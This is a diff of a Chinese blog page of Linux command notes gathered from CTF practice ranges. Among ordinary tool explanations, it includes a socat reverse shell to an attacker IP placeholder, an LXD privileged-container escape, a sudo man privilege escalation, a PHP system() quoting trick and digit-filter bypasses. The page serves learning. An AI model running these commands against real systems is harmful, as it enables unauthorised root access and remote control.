@@ -28,7 +28,7 @@
 <meta property="og:description" content="靶场或者平时遇到的linux指令记录">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-01-30T03:32:44.000Z">
-<meta property="article:modified_time" content="2025-02-18T03:52:45.201Z">
+<meta property="article:modified_time" content="2025-02-24T06:36:00.693Z">
 <meta property="article:author" content="guayu-kakeru">
 <meta property="article:tag" content="linux">
 <meta property="article:tag" content="操作系统">
@@ -226,7 +226,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-02-18 11:52:45" itemprop="dateModified" datetime="2025-02-18T11:52:45+08:00">2025-02-18</time>
+                <time title="修改时间：2025-02-24 14:36:00" itemprop="dateModified" datetime="2025-02-24T14:36:00+08:00">2025-02-24</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1106,6 +1106,494 @@
 </ol>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#（1）获取 Alpine Linux 镜像</span></span><br><span class="line">wget http://攻击机IP/alpine-v3.13-x86_64-20210218_0139.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#lxd初始化</span></span><br><span class="line">lxd init   <span class="comment">#一路回车</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#然后导入镜像：</span></span><br><span class="line">lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --<span class="built_in">alias</span> image_name</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建特权容器</span></span><br><span class="line">lxc init image_name ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#挂载宿主机的根目录</span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#启动并进入容器</span></span><br><span class="line">lxc start ignite </span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#切换到宿主机环境</span></span><br><span class="line"><span class="built_in">chroot</span> /mnt/root</span><br></pre></td></tr></table></figure></div>
 
+<h2 id="socat端口转发"><a href="#socat端口转发" class="headerlink" title="socat端口转发"></a>socat端口转发</h2><p><code>socat</code> 主要用于在两个数据流之间建立双向通信。例如，可以在本地监听一个端口，并将数据转发到远程服务器上的指定端口。</p>
+<h3 id="本地端口转发（将本地端口流量转发到远程）"><a href="#本地端口转发（将本地端口流量转发到远程）" class="headerlink" title="本地端口转发（将本地端口流量转发到远程）"></a>本地端口转发（将本地端口流量转发到远程）</h3><p>示例：本地监听 8080，将请求转发到 192.168.1.100:80</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">socat</span> TCP-LISTEN:<span class="number">8080</span>,fork TCP:<span class="number">192.168.1.100:80</span></span><br></pre></td></tr></table></figure></div>
+<h3 id="远程端口转发（将远程端口的流量转发到本地）"><a href="#远程端口转发（将远程端口的流量转发到本地）" class="headerlink" title="远程端口转发（将远程端口的流量转发到本地）"></a>远程端口转发（将远程端口的流量转发到本地）</h3><p>示例：监听远程服务器的 9000 端口，并转发到本地的 8080 端口</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">socat</span> TCP-LISTEN:<span class="number">9000</span>,reuseaddr,fork TCP:<span class="number">127.0.0.1:8080</span></span><br></pre></td></tr></table></figure></div>
+<h3 id="反向代理（将访问远程端口的请求转发到另一个远程地址）"><a href="#反向代理（将访问远程端口的请求转发到另一个远程地址）" class="headerlink" title="反向代理（将访问远程端口的请求转发到另一个远程地址）"></a>反向代理（将访问远程端口的请求转发到另一个远程地址）</h3><p>示例：监听本地 4444 端口，并转发到远程 10.10.10.10:5555</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">socat</span> TCP-LISTEN:<span class="number">4444</span>,reuseaddr,fork TCP:<span class="number">10.10.10.10:5555</span></span><br></pre></td></tr></table></figure></div>
+<h3 id="UDP端口转发"><a href="#UDP端口转发" class="headerlink" title="UDP端口转发"></a>UDP端口转发</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">socat</span> UDP-LISTEN:<span class="number">9999</span>,reuseaddr,fork UDP:<span class="number">192.168.1.200:53</span></span><br></pre></td></tr></table></figure></div>
+<h3 id="反向-Shell（监听远程主机的反连）"><a href="#反向-Shell（监听远程主机的反连）" class="headerlink" title="反向 Shell（监听远程主机的反连）"></a>反向 Shell（监听远程主机的反连）</h3><p>示例：受控机器通过 <code>socat</code> 连接到攻击机 4444 端口，并提供交互式 shell</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">socat</span> TCP:攻击机IP:<span class="number">4444</span> EXEC:<span class="string">&quot;/bin/bash&quot;</span>,pty,stderr,sigint,setsid,sane</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>reuseaddr</code>：允许端口重用，避免 “端口已被占用” 的问题。</li>
+<li><code>fork</code>：让 <code>socat</code> 处理多个连接，而不是只接受一个。<br>上面的指令最后加上&amp;,让它在后台进行</li>
+</ul>
+<h2 id="netstat-lntup"><a href="#netstat-lntup" class="headerlink" title="netstat -lntup"></a>netstat -lntup</h2><p><code>netstat -lntup</code> 是 Linux 下用于查看当前监听的网络端口及其对应进程的命令。</p>
+<h3 id="参数解析"><a href="#参数解析" class="headerlink" title="参数解析"></a>参数解析</h3><ul>
+<li><code>-l</code> (<code>--listening</code>)：显示 <strong>正在监听</strong> 的端口（即服务在等待连接）。</li>
+<li><code>-n</code> (<code>--numeric</code>)：以 <strong>数字格式</strong> 显示 IP 和端口（不解析域名）。</li>
+<li><code>-t</code> (<code>--tcp</code>)：显示 <strong>TCP</strong> 端口。</li>
+<li><code>-u</code> (<code>--udp</code>)：显示 <strong>UDP</strong> 端口。</li>
+<li><code>-p</code> (<code>--programs</code>)：显示 <strong>进程信息</strong>（如进程 ID 和名称）。</li>
+</ul>
+<h2 id="ss"><a href="#ss" class="headerlink" title="ss"></a>ss</h2><p><code>ss</code>（<strong>socket statistics</strong>）是 <code>netstat</code> 的现代替代工具，用于显示套接字（socket）相关信息。它比 <code>netstat</code> 更快，占用更少的系统资源，并且默认安装在大多数 Linux 发行版上。</p>
+<h2 id="🔹-常见选项"><a href="#🔹-常见选项" class="headerlink" title="🔹 常见选项"></a>🔹 <strong>常见选项</strong></h2><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-t</code></td>
+<td>显示 TCP 连接</td>
+</tr>
+<tr>
+<td><code>-u</code></td>
+<td>显示 UDP 连接</td>
+</tr>
+<tr>
+<td><code>-l</code></td>
+<td>仅显示监听（LISTEN）端口</td>
+</tr>
+<tr>
+<td><code>-n</code></td>
+<td>不解析主机名和端口（显示数字）</td>
+</tr>
+<tr>
+<td><code>-p</code></td>
+<td>显示进程 PID 和名称</td>
+</tr>
+<tr>
+<td><code>-a</code></td>
+<td>显示所有连接（包括监听和已建立的）</td>
+</tr>
+<tr>
+<td><code>-s</code></td>
+<td>显示套接字统计信息</td>
+</tr>
+<tr>
+<td><code>-i</code></td>
+<td>显示详细的内部信息</td>
+</tr>
+<tr>
+<td><code>-4</code></td>
+<td>仅显示 IPv4 连接</td>
+</tr>
+<tr>
+<td><code>-6</code></td>
+<td>仅显示 IPv6 连接</td>
+</tr>
+<tr>
+<td>查看正在使用的端口就用</td>
+<td></td>
+</tr>
+</tbody></table>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ss -tulnp</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="shansum"><a href="#shansum" class="headerlink" title="shansum"></a>shansum</h2><p>以sha1sum举例。<code>sha1sum</code> 是 Linux 中用来计算文件或字符串的 <strong>SHA-1 哈希值</strong> 的命令。SHA-1（Secure Hash Algorithm 1）是一种常见的哈希算法，输出 160 位（20 字节）的哈希值，通常用 40 个十六进制字符表示。</p>
+<h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha1sum <span class="tag">&lt;<span class="name">filename</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<h3 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a><strong>常用选项</strong></h3><table>
+<thead>
+<tr>
+<th>选项</th>
+<th>说明</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-b</code></td>
+<td><strong>以二进制模式计算哈希</strong></td>
+<td><code>sha1sum -b file.txt</code></td>
+</tr>
+<tr>
+<td><code>-c</code></td>
+<td><strong>校验文件是否与提供的哈希值匹配</strong></td>
+<td><code>sha1sum -c file.sha1</code></td>
+</tr>
+<tr>
+<td><code>--check</code></td>
+<td><strong>与 <code>-c</code> 相同，校验文件的哈希值</strong></td>
+<td><code>sha1sum --check file.sha1</code></td>
+</tr>
+<tr>
+<td><code>--quiet</code></td>
+<td><strong>在校验时不输出任何信息，只有错误时显示</strong></td>
+<td><code>sha1sum --check --quiet file.sha1</code></td>
+</tr>
+<tr>
+<td><code>-t</code></td>
+<td><strong>指定输出哈希值的长度（默认是 40）</strong></td>
+<td><code>sha1sum -t 20 file.txt</code></td>
+</tr>
+<tr>
+<td><code>-h</code></td>
+<td><strong>显示帮助信息</strong></td>
+<td></td>
+</tr>
+</tbody></table>
+<h2 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h2><p>nl 命令在 <a target="_blank" rel="noopener" href="http://codex.wordpress.org.cn/Linux">linux</a> 系统中用来计算文件中行号。nl 可以将输出的文件内容自动的加上行号！其默认的结果与 cat -n 有点不太一样， nl 可以将行号做比较多的显示设计，包括位数与是否自动补齐 0 等等的功能。</p>
+<h3 id="命令格式："><a href="#命令格式：" class="headerlink" title="命令格式："></a>命令格式：</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PROLOG"><figure class="iseeu highlight /prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl [选项]... [文件]...</span><br></pre></td></tr></table></figure></div>
+<h3 id="命令参数："><a href="#命令参数：" class="headerlink" title="命令参数："></a>命令参数：</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DIFF"><figure class="iseeu highlight /diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-b  ：指定行号指定的方式，主要有两种：</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-b a ：表示不论是否为空行，也同样列出行号 (类似 cat -n)；</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-b t ：如果有空行，空的那一行不要列出行号 (默认值)；</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-n  ：列出行号表示的方法，主要有三种：</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-n ln ：行号在萤幕的最左方显示；</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-n rn ：行号在自己栏位的最右方显示，且不加 0 ；</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-n rz ：行号在自己栏位的最右方显示，且加 0 ；</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-w  ：行号栏位的占用的位数。</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">-p 在逻辑定界符处不重新开始计算。</span></span><br></pre></td></tr></table></figure></div>
+<h2 id="shell引号"><a href="#shell引号" class="headerlink" title="shell引号"></a>shell引号</h2><p>在 shell 中，<code>&#39;&quot;&#39;&quot;&#39;</code>（单引号 + 双引号 + 单引号 + 双引号 + 单引号）是一个技巧，用来在单引号包围的字符串中插入一个单引号。要理解何时使用它，需要掌握 shell 的引号规则：</p>
+<ol>
+<li><p><strong>单引号 (<code>&#39;</code>)</strong></p>
+<ul>
+<li>单引号内的所有字符都被视为原样，不会进行变量替换或转义。</li>
+<li>不能在单引号内直接插入单引号，除非打破单引号的范围。</li>
+</ul>
+</li>
+<li><p><strong>双引号 (<code>&quot;</code>)</strong></p>
+<ul>
+<li>允许变量替换和命令替换（<code>$VAR</code>、<code>$(command)</code>）。</li>
+<li>但不会解析 <code>\</code>（除非用于转义 <code>$</code>、<code>`</code> 或 <code>&quot;</code>）。</li>
+</ul>
+</li>
+</ol>
+<p>如果需要在一个单引号字符串内插入单引号（例如 <code>system(&#39;cat fl*&#39;)</code>），就必须在单引号外部打破它。例如：</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">&#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span> (<span class="string">&#x27;&quot;&#x27;</span><span class="string">&quot;&#x27;cat fl*&#x27;&quot;</span><span class="string">&#x27;&quot;&#x27;</span>);<span class="meta">?&gt;</span></span><span class="language-xml">&#x27;</span></span><br><span class="line"><span class="language-xml">等效</span></span><br><span class="line"><span class="language-xml">&#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span> (<span class="string">&#x27; + &quot;&#x27;</span><span class="string">&quot; + &#x27;cat fl*&#x27; + &quot;</span><span class="string">&#x27;&quot; + &#x27;</span>);<span class="meta">?&gt;</span></span><span class="language-xml">&#x27;</span></span><br></pre></td></tr></table></figure>
+<h3 id="分解："><a href="#分解：" class="headerlink" title="分解："></a>分解：</h3><ul>
+<li><strong>第一部分</strong> <code>&#39;&lt;?php system (&#39;</code> <strong>→ 以单引号开头</strong></li>
+<li><strong>第二部分</strong> <code>&#39;&quot;&#39;&quot;&#39;</code> <strong>→ 插入单引号</strong><ul>
+<li><code>&#39;&quot;&#39;</code> <strong>(结束单引号 + 开启双引号)</strong> → 进入双引号模式</li>
+<li><code>&quot;&#39;&quot;</code> <strong>(双引号内输入单引号)</strong> → 由于双引号内的单引号有效，它可以作为 PHP 代码的一部分</li>
+<li><code>&#39;&quot;&#39;</code> <strong>(关闭双引号 + 重新开启单引号)</strong> → 返回单引号模式</li>
+</ul>
+</li>
+<li><strong>第三部分</strong> <code>&#39;cat fl*&#39;</code> <strong>→ 继续单引号字符串</strong></li>
+<li><strong>第四部分</strong> <code>&#39;&quot;&#39;&quot;&#39;</code> <strong>→ 再次插入单引号</strong></li>
+<li><strong>第五部分</strong> <code>&#39;);?&gt;&#39;</code> <strong>→ 结束单引号字符串</strong></li>
+</ul>
+<h2 id="ssh-authorized-keys-1"><a href="#ssh-authorized-keys-1" class="headerlink" title="~&#x2F;.ssh&#x2F;authorized_keys"></a>~&#x2F;.ssh&#x2F;authorized_keys</h2><p><code>~/.ssh/authorized_keys</code> 是一个 <strong>公钥认证</strong> 文件，它存储的是 <strong>可以用于无密码 SSH 登录该账户的公钥</strong>。</p>
+<h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a><strong>作用</strong></h3><p>当你尝试通过 SSH 登录到一个账户时（比如 <code>ssh user@host</code>），SSH 服务器会检查 <code>~/.ssh/authorized_keys</code> 文件，如果其中包含与你的私钥匹配的公钥，就允许你登录，而 <strong>无需输入密码</strong>。<br><code>~/.ssh/authorized_keys</code> <strong>支持在公钥前面指定 <code>command=</code> 选项</strong>，这样 <strong>每次有人使用该公钥登录时，就会自动执行指定的命令</strong>，而不会启动普通的 shell。</p>
+<h3 id="用私钥生成公钥-1"><a href="#用私钥生成公钥-1" class="headerlink" title="用私钥生成公钥"></a>用私钥生成公钥</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -<span class="attribute">y</span> -f id_rsa &gt; authorized_keys</span><br></pre></td></tr></table></figure></div>
+<p>📌 <strong>说明</strong>：</p>
+<ul>
+<li><code>-y</code>：从私钥中提取公钥</li>
+<li><code>-f id_rsa</code>：指定私钥文件</li>
+<li><code>&gt; authorized_keys</code>：输出公钥到文件</li>
+</ul>
+<h2 id="逃逸"><a href="#逃逸" class="headerlink" title="/*逃逸"></a><code>/*逃逸</code></h2><p>用<code>/*</code>说明执行<code>/</code>后面的所有内容，那可以写<code>../../../</code>逃逸到有写入权限的目录。</p>
+<h2 id="tee"><a href="#tee" class="headerlink" title="tee"></a>tee</h2><p><code>tee</code> 是一个在类 Unix 系统中常用的命令，它用于从标准输入读取数据，并将其同时输出到标准输出和一个或多个文件中。这对于在不丢失数据的情况下同时查看和保存输出非常有用。</p>
+<h3 id="常见选项："><a href="#常见选项：" class="headerlink" title="常见选项："></a>常见选项：</h3><ul>
+<li><code>-a</code>：追加到文件，而不是覆盖文件。</li>
+<li><code>-i</code>：忽略中断信号。</li>
+<li><code>-p</code>：在文件写入之前显示输出。</li>
+</ul>
+<h2 id="man"><a href="#man" class="headerlink" title="man"></a>man</h2><p><code>man</code>（manual）是 Linux 和 Unix 系统中的 <strong>手册（Manual）</strong> 命令，主要用于查看 <strong>命令、库函数、配置文件等的文档</strong>。<br>几乎所有 Linux 命令都有对应的 <code>man</code> 手册，格式 <strong>标准、结构清晰</strong>，是学习 Linux 的重要参考资料。<br><code>man</code> 手册分为 <strong>多个章节</strong>，不同章节的条目可能有相同的名称，但内容不同：</p>
+<table>
+<thead>
+<tr>
+<th><strong>章节</strong></th>
+<th><strong>内容</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>1</strong></td>
+<td>用户命令（常见命令，如 <code>ls</code>、<code>cd</code>、<code>grep</code>）</td>
+</tr>
+<tr>
+<td><strong>2</strong></td>
+<td>系统调用（如 <code>open()</code>、<code>read()</code>，需要 <code>#include</code>）</td>
+</tr>
+<tr>
+<td><strong>3</strong></td>
+<td>库函数（如 <code>printf()</code>、<code>malloc()</code>，需要 <code>#include</code>）</td>
+</tr>
+<tr>
+<td><strong>4</strong></td>
+<td>设备文件（如 <code>/dev/null</code>）</td>
+</tr>
+<tr>
+<td><strong>5</strong></td>
+<td>配置文件格式（如 <code>/etc/passwd</code>）</td>
+</tr>
+<tr>
+<td><strong>6</strong></td>
+<td>游戏和娱乐</td>
+</tr>
+<tr>
+<td><strong>7</strong></td>
+<td>杂项（如 <code>man 7 regex</code> 解释正则表达式）</td>
+</tr>
+<tr>
+<td><strong>8</strong></td>
+<td>管理员命令（如 <code>iptables</code>，需要 root 权限）</td>
+</tr>
+</tbody></table>
+<h2 id="man-命令的常用选项"><a href="#man-命令的常用选项" class="headerlink" title="man 命令的常用选项"></a><strong><code>man</code> 命令的常用选项</strong></h2><table>
+<thead>
+<tr>
+<th><strong>选项</strong></th>
+<th><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-f</code></td>
+<td>查找命令属于哪个 <code>man</code> 章节（等同于 <code>whatis</code>）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>关键字搜索手册（等同于 <code>apropos</code>）</td>
+</tr>
+<tr>
+<td><code>-P &lt;pager&gt;</code></td>
+<td>指定分页器（默认 <code>less</code>）</td>
+</tr>
+<tr>
+<td><code>-a</code></td>
+<td>显示所有匹配的手册</td>
+</tr>
+<tr>
+<td><code>-l &lt;file&gt;</code></td>
+<td>读取本地 <code>man</code> 手册</td>
+</tr>
+<tr>
+<td><code>-w</code></td>
+<td>仅显示手册路径，不打开</td>
+</tr>
+<tr>
+<td>在有的题目中如果用man提权无法直接打开，要指定分页器</td>
+<td></td>
+</tr>
+</tbody></table>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#报错信息</span></span><br><span class="line">Your terminal lacks <span class="keyword">the</span> ability <span class="built_in">to</span> <span class="built_in">clear</span> <span class="keyword">the</span> screen <span class="keyword">or</span> position <span class="keyword">the</span> cursor.</span><br><span class="line"></span><br><span class="line">sudo /bin/man -P /usr/bin/less man</span><br></pre></td></tr></table></figure></div>
+
+<h2 id=""><a href="#" class="headerlink" title="$(())"></a>$(())</h2><p>这是shell中的计算符，里面跟上计算式 , 里面没有值就是0<br>~是取反，值等于+1再相反，比如-37的反就是36 , 有的题目过滤了数字，但是要拼出一个数字就用这种方法<br>比如</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="keyword">BEGIN</span>&#123;<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">36</span>;i++)&#123;a=a<span class="string">&quot;<span class="variable">$</span>((~<span class="variable">$</span>(())))&quot;</span>&#125;print <span class="string">&quot;<span class="variable">$</span>((~(&quot;</span>a<span class="string">&quot;)))&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>((~(<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(()))))))</span><br><span class="line"></span><br><span class="line"><span class="number">36</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="usr-lib"><a href="#usr-lib" class="headerlink" title="&#x2F;usr&#x2F;lib"></a>&#x2F;usr&#x2F;lib</h2><p>在 Linux 系统中，<code>/usr/lib</code> 目录通常用于存放 <strong>系统和用户程序的库文件</strong>（shared libraries）</p>
+<h3 id="1-共享库（Shared-Libraries）"><a href="#1-共享库（Shared-Libraries）" class="headerlink" title="1. 共享库（Shared Libraries）"></a><strong>1. 共享库（Shared Libraries）</strong></h3><ul>
+<li>例如：<code>libc.so</code>（C 标准库）、<code>libssl.so</code>（OpenSSL 加密库）等</li>
+</ul>
+<h3 id="2-依赖库（Dependency-Libraries）"><a href="#2-依赖库（Dependency-Libraries）" class="headerlink" title="2. 依赖库（Dependency Libraries）"></a><strong>2. 依赖库（Dependency Libraries）</strong></h3><ul>
+<li>存放各种软件的依赖库，例如 Python、Perl、Node.js、Qt、GTK 相关的库</li>
+<li>例如：<ul>
+<li><code>/usr/lib/python3.9/</code> → Python 3.9 相关的库</li>
+<li><code>/usr/lib/node_modules/</code> → Node.js 全局安装的模块</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-插件（Plugins）"><a href="#3-插件（Plugins）" class="headerlink" title="3. 插件（Plugins）"></a><strong>3. 插件（Plugins）</strong></h3><ul>
+<li>某些软件的插件或模块也会放在 <code>/usr/lib</code></li>
+<li>例如：<ul>
+<li><code>/usr/lib/firefox/</code> → Firefox 的插件</li>
+<li><code>/usr/lib/vim/</code> → Vim 相关插件</li>
+</ul>
+</li>
+</ul>
+<h3 id="4-32-位与-64-位库"><a href="#4-32-位与-64-位库" class="headerlink" title="4. 32 位与 64 位库"></a><strong>4. 32 位与 64 位库</strong></h3><ul>
+<li>在 64 位系统中：<ul>
+<li><code>/usr/lib/</code> 可能用于 32 位库（某些系统）</li>
+<li><code>/usr/lib64/</code> 存放 64 位库</li>
+</ul>
+</li>
+</ul>
+<p>所以找python的一些库的函数就到&#x2F;usr&#x2F;lib&#x2F;pythonx中找</p>
+<h2 id="lynx"><a href="#lynx" class="headerlink" title="lynx"></a>lynx</h2><p><code>lynx</code> 是 Linux 下的一款基于终端的文本模式 Web 浏览器，它允许用户在没有图形界面的环境下访问网页。由于 <code>lynx</code> 只显示纯文本，它在服务器环境、远程管理（如 SSH）、无 GUI 的系统以及需要快速访问网页时非常有用。<br>而且还有file:&#x2F;&#x2F; http:&#x2F;&#x2F; ftp:&#x2F;&#x2F; 等协议 可以查看本地文件</p>
+<h2 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p>是 Linux 系统中的一个环境变量，用于在程序运行时动态加载指定的共享库。LD_PRELOAD 的作用是在程序运行前，将指定的共享库加载到程序的内存中。这样，程序在运行时会优先使用该共享库中的符号，而不是系统默认的符号。LD_PRELOAD 可以用于替换程序本身的函数，增加程序的功能或者调试程序。</p>
+<p>LD_PRELOAD 的工作原理是，当程序需要调用某个符号时，系统会先在程序自身的符号表中查找，如果找不到，则会在 LD_PRELOAD 指定的共享库中查找。如果在 LD_PRELOAD 指定的共享库中找到了该符号，则使用该符号中的代码。</p>
+<p>使用 LD_PRELOAD 可以实现一些特殊的功能，例如：</p>
+<p>动态库劫持：可以用 LD_PRELOAD 来劫持程序中的函数，替换为自己编写的函数，实现一些特殊的功能。</p>
+<p>程序调试：可以用 LD_PRELOAD 来替换程序中的函数，增加一些调试信息，例如，在程序中调用 printf 函数时，可以用 LD_PRELOAD 来替换为自己编写的函数，输出调试信息。</p>
+<p>库版本控制：可以用 LD_PRELOAD 来强制程序使用指定版本的共享库，以避免程序在不同版本的环境中产生兼容性问题。<br>两种利用代码</p>
